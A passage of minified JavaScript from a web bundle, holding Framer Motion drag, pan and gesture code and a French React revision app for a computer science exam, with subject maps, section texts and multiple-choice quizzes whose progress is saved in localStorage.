v=Va(this.lastMoveEventInfo,this.history),x=this.startEvent!==null,b=Pb(v.offset,{x:0,y:0})>=this.distanceThreshold;if(!x&&!b)return;const{point:h}=v;this.history.push({...h,timestamp:le.now()});const{onStart:m,onMove:f}=this.handlers;x||(m&&m(this.lastMoveEvent,v),this.startEvent=this.lastMoveEvent),f&&f(this.lastMoveEvent,v)},this.handlePointerMove=(v,x)=>{this.lastMoveEvent=v,this.lastRawMoveEventInfo=x,this.lastMoveEventInfo=Dr(x,this.transformPagePoint),this.hasPendingMove=!0,U.update(this.updatePoint,!0)},this.handlePointerUp=(v,x)=>{this.hasPendingMove&&this.updatePoint(),this.end();const{onEnd:b,onSessionEnd:h,resumeAnimation:m}=this.handlers;if((this.dragSnapToOrigin||!this.startEvent)&&m&&m(),!(this.lastMoveEvent&&this.lastMoveEventInfo))return;const f=Va(v.type==="pointercancel"?this.lastMoveEventInfo:Dr(x,this.transformPagePoint),this.history);this.startEvent&&b&&b(v,f),h&&h(v,f)},!Nu(n))return;this.dragSnapToOrigin=s,this.handlers=t,this.transformPagePoint=i,this.distanceThreshold=a,this.contextWindow=r||window;const l=ea(n),u=Dr(l,this.transformPagePoint),{point:c}=u,{timestamp:d}=ie;this.history=[{...c,timestamp:d}];const{onSessionStart:p}=t;p&&p(n,Va(u,this.history));const g={passive:!0,capture:!0};this.removeListeners=tr(Ti(this.contextWindow,"pointermove",this.handlePointerMove,g),Ti(this.contextWindow,"pointerup",this.handlePointerUp,g),Ti(this.contextWindow,"pointercancel",this.handlePointerUp,g)),o&&this.startScrollTracking(o)}startScrollTracking(n){let t=n.parentElement;for(;t;){const i=getComputedStyle(t);(np.has(i.overflowX)||np.has(i.overflowY))&&this.scrollPositions.set(t,{x:t.scrollLeft,y:t.scrollTop}),t=t.parentElement}this.scrollPositions.set(window,{x:window.scrollX,y:window.scrollY}),window.addEventListener("scroll",this.onElementScroll,{capture:!0}),window.addEventListener("scroll",this.onWindowScroll),this.removeScrollListeners=()=>{window.removeEventListener("scroll",this.onElementScroll,{capture:!0}),window.removeEventListener("scroll",this.onWindowScroll)}}handleScroll(n){const t=this.scrollPositions.get(n);if(!t)return;const i=n===window,r=i?{x:window.scrollX,y:window.scrollY}:{x:n.scrollLeft,y:n.scrollTop},s={x:r.x-t.x,y:r.y-t.y};s.x===0&&s.y===0||(i?this.lastMoveEventInfo&&(this.lastMoveEventInfo.point.x+=s.x,this.lastMoveEventInfo.point.y+=s.y):this.history.length>0&&(this.history[0].x-=s.x,this.history[0].y-=s.y),this.scrollPositions.set(n,r),U.update(this.updatePoint,!0))}updateHandlers(n){this.handlers=n}end(){this.removeListeners&&this.removeListeners(),this.removeScrollListeners&&this.removeScrollListeners(),this.scrollPositions.clear(),Vn(this.updatePoint)}}function Dr(e,n){return n?{point:n(e.point)}:e}function tp(e,n){return{x:e.x-n.x,y:e.y-n.y}}function Va({point:e},n){return{point:e,delta:tp(e,ig(n)),offset:tp(e,Tb(n)),velocity:Lb(n,.1)}}function Tb(e){return e[0]}function ig(e){return e[e.length-1]}function Lb(e,n){if(e.length<2)return{x:0,y:0};let t=e.length-1,i=null;const r=ig(e);for(;t>=0&&(i=e[t],!(r.timestamp-i.timestamp>je(n)));)t--;if(!i)return{x:0,y:0};i===e[0]&&e.length>2&&r.timestamp-i.timestamp>je(n)*2&&(i=e[1]);const s=Fe(r.timestamp-i.timestamp);if(s===0)return{x:0,y:0};const a={x:(r.x-i.x)/s,y:(r.y-i.y)/s};return a.x===1/0&&(a.x=0),a.y===1/0&&(a.y=0),a}function Rb(e,{min:n,max:t},i){return n!==void 0&&e<n?e=i?j(n,e,i.min):Math.max(e,n):t!==void 0&&e>t&&(e=i?j(t,e,i.max):Math.min(e,t)),e}function ip(e,n,t){return{min:n!==void 0?e.min+n:void 0,max:t!==void 0?e.max+t-(e.max-e.min):void 0}}function Db(e,{top:n,left:t,bottom:i,right:r}){return{x:ip(e.x,t,r),y:ip(e.y,n,i)}}function rp(e,n){let t=n.min-e.min,i=n.max-e.max;return n.max-n.min<e.max-e.min&&([t,i]=[i,t]),{min:t,max:i}}function qb(e,n){return{x:rp(e.x,n.x),y:rp(e.y,n.y)}}function Nb(e,n){let t=.5;const i=ve(e),r=ve(n);return r>i?t=Gi(n.min,n.max-i,e.min):i>r&&(t=Gi(e.min,e.max-r,n.min)),Ze(0,1,t)}function Ib(e,n){const t={};return n.min!==void 0&&(t.min=n.min-e.min),n.max!==void 0&&(t.max=n.max-e.min),t}const ul=.35;function Mb(e=ul){return e===!1?e=0:e===!0&&(e=ul),{x:sp(e,"left","right"),y:sp(e,"top","bottom")}}function sp(e,n,t){return{min:ap(e,n),max:ap(e,t)}}function ap(e,n){return typeof e=="number"?e:e[n]||0}const Ob=new WeakMap;class wb{constructor(n){this.openDragLock=null,this.isDragging=!1,this.currentDirection=null,this.originPoint={x:0,y:0},this.constraints=!1,this.hasMutatedConstraints=!1,this.elastic=Z(),this.latestPointerEvent=null,this.latestPanInfo=null,this.visualElement=n}start(n,{snapToCursor:t=!1,distanceThreshold:i}={}){const{presenceContext:r}=this.visualElement;if(r&&r.isPresent===!1)return;const s=d=>{t&&this.snapToCursor(d),this.stopAnimation()},a=(d,p)=>{const{drag:g,dragPropagation:v,onDragStart:x}=this.getProps();if(g&&!v&&(this.openDragLock&&this.openDragLock(),this.openDragLock=Sx(g),!this.openDragLock))return;this.latestPointerEvent=d,this.latestPanInfo=p,this.isDragging=!0,this.currentDirection=null,this.resolveConstraints(),this.visualElement.projection&&(this.visualElement.projection.isAnimationBlocked=!0,this.visualElement.projection.target=void 0),tn(h=>{let m=this.getAxisMotionValue(h).get()||0;if(ln.test(m)){const{projection:f}=this.visualElement;if(f&&f.layout){const y=f.layout.layoutBox[h];y&&(m=ve(y)*(parseFloat(m)/100))}}this.originPoint[h]=m}),x&&U.update(()=>x(d,p),!1,!0),nl(this.visualElement,"transform");const{animationState:b}=this.visualElement;b&&b.setActive("whileDrag",!0)},o=(d,p)=>{this.latestPointerEvent=d,this.latestPanInfo=p;const{dragPropagation:g,dragDirectionLock:v,onDirectionLock:x,onDrag:b}=this.getProps();if(!g&&!this.openDragLock)return;const{offset:h}=p;if(v&&this.currentDirection===null){this.currentDirection=Fb(h),this.currentDirection!==null&&x&&x(this.currentDirection);return}this.updateAxis("x",p.point,h),this.updateAxis("y",p.point,h),this.visualElement.render(),b&&U.update(()=>b(d,p),!1,!0)},l=(d,p)=>{this.latestPointerEvent=d,this.latestPanInfo=p,this.stop(d,p),this.latestPointerEvent=null,this.latestPanInfo=null},u=()=>{const{dragSnapToOrigin:d}=this.getProps();(d||this.constraints)&&this.startAnimation({x:0,y:0})},{dragSnapToOrigin:c}=this.getProps();this.panSession=new tg(n,{onSessionStart:s,onStart:a,onMove:o,onSessionEnd:l,resumeAnimation:u},{transformPagePoint:this.visualElement.getTransformPagePoint(),dragSnapToOrigin:c,distanceThreshold:i,contextWindow:ng(this.visualElement),element:this.visualElement.current})}stop(n,t){const i=n||this.latestPointerEvent,r=t||this.latestPanInfo,s=this.isDragging;if(this.cancel(),!s||!r||!i)return;const{velocity:a}=r;this.startAnimation(a);const{onDragEnd:o}=this.getProps();o&&U.postRender(()=>o(i,r))}cancel(){this.isDragging=!1;const{projection:n,animationState:t}=this.visualElement;n&&(n.isAnimationBlocked=!1),this.endPanSession();const{dragPropagation:i}=this.getProps();!i&&this.openDragLock&&(this.openDragLock(),this.openDragLock=null),t&&t.setActive("whileDrag",!1)}endPanSession(){this.panSession&&this.panSession.end(),this.panSession=void 0}updateAxis(n,t,i){const{drag:r}=this.getProps();if(!i||!qr(n,r,this.currentDirection))return;const s=this.getAxisMotionValue(n);let a=this.originPoint[n]+i[n];this.constraints&&this.constraints[n]&&(a=Rb(a,this.constraints[n],this.elastic[n])),s.set(a)}resolveConstraints(){var s;const{dragConstraints:n,dragElastic:t}=this.getProps(),i=this.visualElement.projection&&!this.visualElement.projection.layout?this.visualElement.projection.measure(!1):(s=this.visualElement.projection)==null?void 0:s.layout,r=this.constraints;n&&vt(n)?this.constraints||(this.constraints=this.resolveRefConstraints()):n&&i?this.constraints=Db(i.layoutBox,n):this.constraints=!1,this.elastic=Mb(t),r!==this.constraints&&!vt(n)&&i&&this.constraints&&!this.hasMutatedConstraints&&tn(a=>{this.constraints!==!1&&this.getAxisMotionValue(a)&&(this.constraints[a]=Ib(i.layoutBox[a],this.constraints[a]))})}resolveRefConstraints(){const{dragConstraints:n,onMeasureDragConstraints:t}=this.getProps();if(!n||!vt(n))return!1;const i=n.current,{projection:r}=this.visualElement;if(!r||!r.layout)return!1;r.root&&(r.root.scroll=void 0,r.root.updateScroll());const s=xx(i,r.root,this.visualElement.getTransformPagePoint());let a=qb(r.layout.layoutBox,s);if(t){const o=t(gx(a));this.hasMutatedConstraints=!!o,o&&(a=x1(o))}return a}startAnimation(n){const{drag:t,dragMomentum:i,dragElastic:r,dragTransition:s,dragSnapToOrigin:a,onDragTransitionEnd:o}=this.getProps(),l=this.constraints||{},u=tn(c=>{if(!qr(c,t,this.currentDirection))return;let d=l&&l[c]||{};(a===!0||a===c)&&(d={min:0,max:0});const p=r?200:1e6,g=r?40:1e7,v={type:"inertia",velocity:i?n[c]:0,bounceStiffness:p,bounceDamping:g,timeConstant:750,restDelta:1,restSpeed:10,...s,...d};return this.startAxisValueAnimation(c,v)});return Promise.all(u).then(o)}startAxisValueAnimation(n,t){const i=this.getAxisMotionValue(n);return nl(this.visualElement,n),i.start(Eu(n,i,0,t,this.visualElement,!1))}stopAnimation(){tn(n=>this.getAxisMotionValue(n).stop())}getAxisMotionValue(n){const t=`_drag${n.toUpperCase()}`,r=this.visualElement.getProps()[t];return r||this.visualElement.getValue(n,this.visualElement.latestValues[n]??0)}snapToCursor({clientX:n,clientY:t}){var o;const{drag:i}=this.getProps(),r={x:n,y:t},s=((o=this.visualElement.getTransformPagePoint())==null?void 0:o(r))||r,a=this.visualElement.measureViewportBox();tn(l=>{if(!qr(l,i,this.currentDirection))return;const u=this.getAxisMotionValue(l),{min:c,max:d}=a[l];u.set((u.get()||0)+s[l]-j(c,d,.5))})}scalePositionWithinConstraints(){if(!this.visualElement.current)return;const{drag:n,dragConstraints:t}=this.getProps(),{projection:i}=this.visualElement;if(!vt(t)||!i||!this.constraints)return;this.stopAnimation();const r=this.constraints,s={x:0,y:0};tn(o=>{const l=this.getAxisMotionValue(o).get();s[o]=Nb({min:l,max:l},r[o])});const{transformTemplate:a}=this.visualElement.getProps();this.visualElement.current.style.transform=a?a({},""):"none",i.root&&i.root.updateScroll(),i.updateLayout(),this.constraints=!1,this.resolveConstraints(),tn(o=>{const l=this.getAxisMotionValue(o);if(!qr(o,n,null)||!l.get())return;const{min:u,max:c}=this.constraints[o];l.set(j(u,c,s[o]))}),this.visualElement.render()}addListeners(){if(!this.visualElement.current)return;Ob.set(this.visualElement,this);const n=this.visualElement.current,t=Ti(n,"pointerdown",u=>{const{drag:c,dragListener:d=!0}=this.getProps(),p=u.target,g=p!==n&&Tx(p);c&&d&&!g&&this.start(u)});let i;const r=()=>{const{dragConstraints:u}=this.getProps();vt(u)&&u.current&&(this.constraints=this.resolveRefConstraints(),i||(i=Bb(n,u.current,()=>this.scalePositionWithinConstraints())))},{projection:s}=this.visualElement,a=s.addEventListener("measure",r);s&&!s.layout&&(s.root&&s.root.updateScroll(),s.updateLayout()),U.read(r);const o=$i(window,"resize",()=>this.scalePositionWithinConstraints()),l=s.addEventListener("didUpdate",({delta:u,hasLayoutChanged:c})=>{this.isDragging&&c&&(tn(d=>{const p=this.getAxisMotionValue(d);p&&(this.originPoint[d]+=u[d].translate,p.set(p.get()+u[d].translate))}),this.visualElement.render())});return()=>{o(),t(),a(),l&&l(),i&&i()}}getProps(){const n=this.visualElement.getProps(),{drag:t=!1,dragDirectionLock:i=!1,dragPropagation:r=!1,dragConstraints:s=!1,dragElastic:a=ul,dragMomentum:o=!0}=n;return{...n,drag:t,dragDirectionLock:i,dragPropagation:r,dragConstraints:s,dragElastic:a,dragMomentum:o}}}function op(e){let n=!0;return()=>{if(n){n=!1;return}e()}}function Bb(e,n,t){const i=Sd(e,op(t)),r=Sd(n,op(t));return()=>{i(),r()}}function qr(e,n,t){return(n===!0||n===e)&&(t===null||t===e)}function Fb(e,n=10){let t=null;return Math.abs(e.y)>n?t="y":Math.abs(e.x)>n&&(t="x"),t}class kb extends Gn{constructor(n){super(n),this.removeGroupControls=Je,this.removeListeners=Je,this.controls=new wb(n)}mount(){const{dragControls:n}=this.node.getProps();n&&(this.removeGroupControls=n.subscribe(this.controls)),this.removeListeners=this.controls.addListeners()||Je}update(){const{dragControls:n}=this.node.getProps(),{dragControls:t}=this.node.prevProps||{};n!==t&&(this.removeGroupControls(),n&&(this.removeGroupControls=n.subscribe(this.controls)))}unmount(){this.removeGroupControls(),this.removeListeners(),this.controls.isDragging||this.controls.endPanSession()}}const _a=e=>(n,t)=>{e&&U.update(()=>e(n,t),!1,!0)};class jb extends Gn{constructor(){super(...arguments),this.removePointerDownListener=Je}onPointerDown(n){this.session=new tg(n,this.createPanHandlers(),{transformPagePoint:this.node.getTransformPagePoint(),contextWindow:ng(this.node)})}createPanHandlers(){const{onPanSessionStart:n,onPanStart:t,onPan:i,onPanEnd:r}=this.node.getProps();return{onSessionStart:_a(n),onStart:_a(t),onMove:_a(i),onEnd:(s,a)=>{delete this.session,r&&U.postRender(()=>r(s,a))}}}mount(){this.removePointerDownListener=Ti(this.node.current,"pointerdown",n=>this.onPointerDown(n))}update(){this.session&&this.session.updateHandlers(this.createPanHandlers())}unmount(){this.removePointerDownListener(),this.session&&this.session.end()}}let Ha=!1;class Ub extends R.Component{componentDidMount(){const{visualElement:n,layoutGroup:t,switchLayoutGroup:i,layoutId:r}=this.props,{projection:s}=n;s&&(t.group&&t.group.add(s),i&&i.register&&r&&i.register(s),Ha&&s.root.didUpdate(),s.addEventListener("animationComplete",()=>{this.safeToRemove()}),s.setOptions({...s.options,layoutDependency:this.props.layoutDependency,onExitComplete:()=>this.safeToRemove()})),Kr.hasEverUpdated=!0}getSnapshotBeforeUpdate(n){const{layoutDependency:t,visualElement:i,drag:r,isPresent:s}=this.props,{projection:a}=i;return a&&(a.isPresent=s,n.layoutDependency!==t&&a.setOptions({...a.options,layoutDependency:t}),Ha=!0,r||n.layoutDependency!==t||t===void 0||n.isPresent!==s?a.willUpdate():this.safeToRemove(),n.isPresent!==s&&(s?a.promote():a.relegate()||U.postRender(()=>{const o=a.getStack();(!o||!o.members.length)&&this.safeToRemove()}))),null}componentDidUpdate(){const{visualElement:n,layoutAnchor:t}=this.props,{projection:i}=n;i&&(i.options.layoutAnchor=t,i.root.didUpdate(),qu.postRender(()=>{!i.currentAnimation&&i.isLead()&&this.safeToRemove()}))}componentWillUnmount(){const{visualElement:n,layoutGroup:t,switchLayoutGroup:i}=this.props,{projection:r}=n;Ha=!0,r&&(r.scheduleCheckAfterUnmount(),t&&t.group&&t.group.remove(r),i&&i.deregister&&i.deregister(r))}safeToRemove(){const{safeToRemove:n}=this.props;n&&n()}render(){return null}}function rg(e){const[n,t]=Q1(),i=R.useContext(su);return E.jsx(Ub,{...e,layoutGroup:i,switchLayoutGroup:R.useContext(Z1),isPresent:n,safeToRemove:t})}const Vb={pan:{Feature:jb},drag:{Feature:kb,ProjectionNode:X1,MeasureLayout:rg}};function lp(e,n,t){const{props:i}=e;e.animationState&&i.whileHover&&e.animationState.setActive("whileHover",t==="Start");const r="onHover"+t,s=i[r];s&&U.postRender(()=>s(n,ea(n)))}class _b extends Gn{mount(){const{current:n}=this.node;n&&(this.unmount=Cx(n,(t,i)=>(lp(this.node,i,"Start"),r=>lp(this.node,r,"End"))))}unmount(){}}class Hb extends Gn{constructor(){super(...arguments),this.isActive=!1}onFocus(){let n=!1;try{n=this.node.current.matches(":focus-visible")}catch{n=!0}!n||!this.node.animationState||(this.node.animationState.setActive("whileFocus",!0),this.isActive=!0)}onBlur(){!this.isActive||!this.node.animationState||(this.node.animationState.setActive("whileFocus",!1),this.isActive=!1)}mount(){this.unmount=tr($i(this.node.current,"focus",()=>this.onFocus()),$i(this.node.current,"blur",()=>this.onBlur()))}unmount(){}}function up(e,n,t){const{props:i}=e;if(e.current instanceof HTMLButtonElement&&e.current.disabled)return;e.animationState&&i.whileTap&&e.animationState.setActive("whileTap",t==="Start");const r="onTap"+(t==="End"?"":t),s=i[r];s&&U.postRender(()=>s(n,ea(n)))}class zb extends Gn{mount(){const{current:n}=this.node;if(!n)return;const{globalTapTarget:t,propagate:i}=this.node.props;this.unmount=Rx(n,(r,s)=>(up(this.node,s,"Start"),(a,{success:o})=>up(this.node,a,o?"End":"Cancel")),{useGlobalTarget:t,stopPropagation:(i==null?void 0:i.tap)===!1})}unmount(){}}const cl=new WeakMap,za=new WeakMap,Gb=e=>{const n=cl.get(e.target);n&&n(e)},Xb=e=>{e.forEach(Gb)};function Qb({root:e,...n}){const t=e||document;za.has(t)||za.set(t,{});const i=za.get(t),r=JSON.stringify(n);return i[r]||(i[r]=new IntersectionObserver(Xb,{root:e,...n})),i[r]}function Wb(e,n,t){const i=Qb(n);return cl.set(e,t),i.observe(e),()=>{cl.delete(e),i.unobserve(e)}}const $b={some:0,all:1};class Kb extends Gn{constructor(){super(...arguments),this.hasEnteredView=!1,this.isInView=!1}startObserver(){var l;(l=this.stopObserver)==null||l.call(this);const{viewport:n={}}=this.node.getProps(),{root:t,margin:i,amount:r="some",once:s}=n,a={root:t?t.current:void 0,rootMargin:i,threshold:typeof r=="number"?r:$b[r]},o=u=>{const{isIntersecting:c}=u;if(this.isInView===c||(this.isInView=c,s&&!c&&this.hasEnteredView))return;c&&(this.hasEnteredView=!0),this.node.animationState&&this.node.animationState.setActive("whileInView",c);const{onViewportEnter:d,onViewportLeave:p}=this.node.getProps(),g=c?d:p;g&&g(u)};this.stopObserver=Wb(this.node.current,a,o)}mount(){this.startObserver()}update(){if(typeof IntersectionObserver>"u")return;const{props:n,prevProps:t}=this.node;["amount","margin","root"].some(Jb(n,t))&&this.startObserver()}unmount(){var n;(n=this.stopObserver)==null||n.call(this),this.hasEnteredView=!1,this.isInView=!1}}function Jb({viewport:e={}},{viewport:n={}}={}){return t=>e[t]!==n[t]}const Yb={inView:{Feature:Kb},tap:{Feature:zb},focus:{Feature:Hb},hover:{Feature:_b}},Zb={layout:{ProjectionNode:X1,MeasureLayout:rg}},eC={...Ab,...Yb,...Vb,...Zb},We=yb(eC,xb),nC=Object.assign({"./data/bd.json":I2,"./data/c.json":O2,"./data/ia.json":B2,"./data/java.json":k2,"./data/linux.json":U2,"./data/maths.json":_2,"./data/python.json":z2,"./data/reseaux.json":X2,"./data/secu.json":W2,"./data/uml.json":K2,"./data/web.json":Y2}),cp=["c","java","python","web","bd","reseaux","uml","secu","ia","maths","linux"],pn=Object.values(nC).map(e=>e.default).sort((e,n)=>cp.indexOf(e.id)-cp.indexOf(n.id)),tC=pn.flatMap(e=>e.sections.map(n=>({...n,sid:e.id}))),dp=(e,n,t,i)=>{const r=(t-e)*.55;return`M${e} ${n}C${e+r} ${n},${t-r} ${i},${t} ${i}`},iC=()=>{try{return JSON.parse(localStorage.getItem("rev")||"{}")}catch{return{}}};function rC({text:e}){const n=[];let t={k:"text",l:[]};return n.push(t),e.split(`
`).forEach(i=>{const r=/^\s*\d{1,3}\s{2,}\S/.test(i)||/^\s{3,}\S/.test(i)&&/[{};]|#include/.test(i),s=i.match(/^\s*([❖➔➣◆☞★])\s*(.*)/);s?(t={k:"alert",icon:s[1],title:s[2],l:[],type:s[1]==="❖"?"def":s[1]==="☞"?"warn":s[1]==="➔"?"sum":s[1]==="◆"?"concept":"info"},n.push(t)):r?(t.k!=="code"&&(t={k:"code",l:[]},n.push(t)),t.l.push(i.replace(/^\s*\d{1,3}\s{2,}/,""))):(t.k==="code"&&i.trim().length>0&&!r&&!/^\s*$/.test(i)&&(t={k:"text",l:[]},n.push(t)),t.l.push(i))}),n.map((i,r)=>{if(i.l.join("").trim().length===0&&!i.title)return null;if(i.k==="code")return E.jsx("pre",{children:i.l.join(`
`).replace(/\n+$/,"")},r);const s=a=>{const o=a.join(`
`).replace(/^\n+|\n+$/g,"");return o?o.split(`
`).map((l,u)=>/^\s*[-ˆ]/.test(l)?E.jsx("li",{style:{marginLeft:20,listStyleType:"disc"},children:l.replace(/^\s*[-ˆ]\s*/,"")},u):E.jsxs("span",{children:[l,`
`]},u)):null};return i.k==="alert"?E.jsxs("div",{className:`alert ${i.type}`,children:[E.jsxs("div",{className:"alert-h",children:[E.jsx("span",{children:i.icon})," ",E.jsx("b",{children:i.title})]}),E.jsx("div",{className:"alert-b",children:s(i.l)})]},r):E.jsx("div",{className:"txt",children:s(i.l)},r)})}function sC({S:e,onClose:n,savedState:t,onUpdate:i}){const r=e.quiz,[s,a]=R.useState((t==null?void 0:t.i)||0),[o,l]=R.useState(null),[u,c]=R.useState((t==null?void 0:t.sc)||0),[d,p]=R.useState(!1),g=r[s],v=b=>{o===null&&(l(b),b===g.a&&c(h=>h+1))},x=()=>{s+1>=r.length?(p(!0),i(0,0,Math.round(100*u/r.length))):(a(s+1),l(null),i(s+1,u))};return E.jsx("div",{className:"overlay",children:E.jsxs(We.div,{initial:{opacity:0,scale:.95,y:20},animate:{opacity:1,scale:1,y:0},exit:{opacity:0,scale:.95,y:20},className:"glass quiz",children:[E.jsx("button",{className:"x",onClick:n,children:"✕"}),d?E.jsxs(E.Fragment,{children:[E.jsxs("h2",{children:["Résultat – ",e.name]}),E.jsxs("div",{className:"big",children:[u,"/",r.length]}),E.jsxs("p",{children:[Math.round(100*u/r.length)," % de réussite"]}),E.jsx("button",{className:"btn",onClick:n,children:"Fermer"})]}):E.jsxs(E.Fragment,{children:[E.jsxs("small",{children:[e.name," · Question ",s+1,"/",r.length]}),E.jsx("pre",{className:"q",children:g.q}),g.o.map((b,h)=>E.jsxs("button",{onClick:()=>v(h),className:"opt "+(o===null?"":h===g.a?"ok":h===o?"ko":""),children:[E.jsx("b",{children:"ABCDE"[h]}),b]},h)),o!==null&&E.jsxs("div",{className:"expl",children:[E.jsx("b",{children:o===g.a?"✔ Correct":"✘ Réponse : "+"ABCDE"[g.a]}),E.jsx("p",{children:g.e}),E.jsx("button",{className:"btn",onClick:x,children:s+1>=r.length?"Terminer":"Suivant →"})]})]})]})})}function aC({S:e,chap:n,setChap:t,sec:i,setSec:r,p:s}){const a=R.useMemo(()=>{const m={};return e.sections.forEach(f=>{var y;return(m[y=f.c]??(m[y]=[])).push(f)}),Object.entries(m).map(([f,y])=>({c:+f,l:y}))},[e]),o=Math.max(0,a.findIndex(m=>m.c===n)),l=a[o],u=58,c=42,d=a.length*u,p=l.l.length*c,g=Math.max(500,d+80,p+80),v=80,x=g/2,b=m=>{const f=(g-d)/2+m*u+u/2,y=f-g/2;return{x:280-y*y/2e3,y:f}},h=m=>({x:580,y:(g-p)/2+m*c+c/2});return E.jsxs("div",{className:"graph",style:{height:g,width:750},children:[E.jsxs("svg",{width:"750",height:g,children:[a.map((m,f)=>{const y=b(f);return E.jsx(We.path,{initial:{pathLength:0},animate:{pathLength:1},transition:{duration:.4,delay:f*.03},d:dp(v,x,y.x,y.y),className:f===o?"on":""},m.c)}),E.jsx(Ki,{children:l.l.map((m,f)=>{const y=b(o),A=h(f);return E.jsx(We.path,{initial:{pathLength:0,opacity:0},animate:{pathLength:1,opacity:1},exit:{opacity:0},transition:{duration:.3,delay:f*.02},d:dp(y.x,y.y,A.x,A.y),className:(i==null?void 0:i.id)===m.id?"on":""},m.id)})})]}),E.jsxs(We.div,{initial:{scale:0,x:"-50%",y:"-50%"},animate:{scale:1,x:"-50%",y:"-50%"},className:"orb",style:{left:v,top:x},children:[E.jsx("i",{}),E.jsx("span",{children:e.name})]}),a.map((m,f)=>{const y=b(f);return E.jsxs(We.button,{initial:{opacity:0,x:"-50%",y:"-50%"},animate:{opacity:1,x:"-50%",y:"-50%"},transition:{delay:f*.03},className:"chap glass "+(f===o?"sel":""),style:{left:y.x,top:y.y},onClick:()=>{t(m.c),r(null)},children:[E.jsx("b",{children:m.l.length}),E.jsxs("small",{children:["Chap. ",m.c]})]},m.c)}),E.jsx(Ki,{children:l.l.map((m,f)=>{const y=h(f);return E.jsxs(We.button,{initial:{opacity:0,x:"-50%",y:"-50%"},animate:{opacity:1,x:"-50%",y:"-50%"},exit:{opacity:0,scale:.9,x:"-50%",y:"-50%"},transition:{delay:f*.02},className:"sn glass "+((i==null?void 0:i.id)===m.id?"sel":""),style:{left:y.x,top:y.y},onClick:()=>r(m),children:[E.jsx("em",{className:y.done[e.id+":"+m.id]?"d":""}),E.jsx("small",{children:m.id}),m.t]},m.id)})})]})}function oC({S:e,sec:n,p:t,toggle:i,open:r,onQuiz:s}){var g,v;const a=e?e.sections:tC,o=a.filter(x=>t.done[(x.sid||e.id)+":"+x.id]).length,l=Math.round(100*o/a.length),u=e?e.quiz.length:pn.reduce((x,b)=>x+b.quiz.length,0),c=e&&n?e.sections.findIndex(x=>x.id===n.id):-1,d=c!==-1&&c<e.sections.length-1?e.sections[c+1]:null,p=()=>{t.done[e.id+":"+n.id]||i(e.id+":"+n.id),d?r(e.id,d):r(e.id,null)};return E.jsxs("aside",{className:`panel glass ${n?"expanded":""}`,children:[E.jsx("div",{className:"pin",children:E.jsx(Ki,{mode:"wait",children:E.jsx(We.div,{initial:{opacity:0,y:15},animate:{opacity:1,y:0},exit:{opacity:0,y:-15},transition:{duration:.25},children:n?E.jsxs(E.Fragment,{children:[E.jsxs("small",{className:"tag",children:[e.name," · ",n.id]}),E.jsx("h2",{children:n.t}),E.jsx("div",{className:"body",children:E.jsx(rC,{text:n.x})})]}):E.jsxs(E.Fragment,{children:[E.jsx("small",{className:"tag",children:e?e.name:"Vue d’ensemble"}),E.jsx("h2",{children:e?"Révision – "+e.name:"Fiche Master · Concours Informatique"}),E.jsxs("div",{className:"ring",style:{"--p":l+"%"},children:[E.jsxs("b",{children:[l,"%"]}),E.jsx("small",{children:"Acquis"})]}),E.jsxs("div",{className:"stats",children:[E.jsxs("div",{className:"glass",children:[E.jsx("b",{children:a.length}),E.jsx("small",{children:"Sections"})]}),E.jsxs("div",{className:"glass",children:[E.jsx("b",{children:u}),E.jsx("small",{children:"QCM"})]}),E.jsxs("div",{className:"glass",children:[E.jsx("b",{children:o}),E.jsx("small",{children:"Acquises"})]}),E.jsxs("div",{className:"glass",children:[E.jsx("b",{children:e?t.best[e.id]??"–":pn.length}),E.jsx("small",{children:e?"Meilleur QCM %":"Matières"})]})]}),E.jsx("div",{className:"row",children:e&&e.quiz.length>0&&E.jsx("button",{className:"btn",onClick:s,children:((v=(g=t.quizProgress)==null?void 0:g[e.id])==null?void 0:v.i)>0?"Reprendre le QCM":"Lancer le QCM"})}),!e&&E.jsx("p",{className:"hint",children:"Choisis une matière sur la carte, explore les chapitres puis les sections. Les QCM viennent directement de la fiche."})]})},n?n.id:e?e.id:"home")})}),n&&E.jsx("div",{style:{marginTop:"14px"},children:E.jsx("button",{className:"btn",style:{margin:0,width:"100%",padding:"14px",fontSize:"15px",fontWeight:"bold"},onClick:p,children:d?"Valider et Passer au suivant ➔":"Valider et Terminer la matière ✔"})})]})}function lC(){var h;const[e,n]=R.useState(()=>localStorage.getItem("theme")||"dark"),[t,i]=R.useState(()=>({done:{},best:{},quizProgress:{},...iC()})),[r,s]=R.useState(null),[a,o]=R.useState(null),[l,u]=R.useState(null),[c,d]=R.useState(!1);R.useEffect(()=>{try{localStorage.setItem("rev",JSON.stringify(t))}catch{}},[t]),R.useEffect(()=>{try{localStorage.setItem("theme",e)}catch{}},[e]);const p=pn.find(m=>m.id===r),g=m=>i(f=>({...f,done:{...f.done,[m]:!f.done[m]}})),v=(m,f)=>{s(m),o(f||null),u(f?f.c:null)},x=(m,f,y)=>{i(A=>{const T=y!==void 0?Math.max(y,A.best[p.id]||0):A.best[p.id];return{...A,best:{...A.best,[p.id]:T},quizProgress:{...A.quizProgress,[p.id]:{i:m,sc:f}}}})},b=250;return E.jsxs("div",{className:`app ${e}`,style:{"--c":(p==null?void 0:p.color)||"#8b9cff"},children:[E.jsxs("div",{className:"bar glass",children:[E.jsx("button",{onClick:()=>n(m=>m==="dark"?"light":"dark"),title:"Changer le thème",children:e==="dark"?"☀️ Mode Clair":"🌙 Mode Sombre"}),E.jsx("button",{onClick:()=>v(null),className:p?"":"on",children:"◉ Carte"}),pn.map(m=>E.jsx("button",{className:r===m.id?"on":"",onClick:()=>v(m.id),title:m.name,children:m.name.split(" ")[0]},m.id))]}),E.jsxs("main",{children:[E.jsx("section",{className:`stage ${a?"shrunk":""}`,children:E.jsx(Ki,{mode:"wait",children:E.jsx(We.div,{initial:{opacity:0,scale:.95},animate:{opacity:1,scale:1},exit:{opacity:0,scale:.95},transition:{duration:.3},className:"w-full h-full",style:{display:"flex",flexDirection:"column",minHeight:"100%"},children:p?E.jsx(aC,{S:p,chap:l??p.sections[0].c,setChap:u,sec:a,setSec:o,p:t}):E.jsxs("div",{className:"graph",style:{height:700,width:860,margin:"auto"},children:[E.jsx("svg",{width:"860",height:"700",children:pn.map((m,f)=>{const y=f/pn.length*6.283-1.57;return E.jsx(We.path,{initial:{pathLength:0},animate:{pathLength:1},transition:{duration:1,delay:.2},d:`M430 350 L${430+b*1.55*Math.cos(y)} ${350+b*1.2*Math.sin(y)}`,style:{"--c":m.color}},m.id)})}),E.jsxs(We.div,{initial:{scale:0,x:"-50%",y:"-50%"},animate:{scale:1,x:"-50%",y:"-50%"},className:"orb",style:{left:430,top:350},children:[E.jsx("i",{}),E.jsx("span",{children:"Fiche 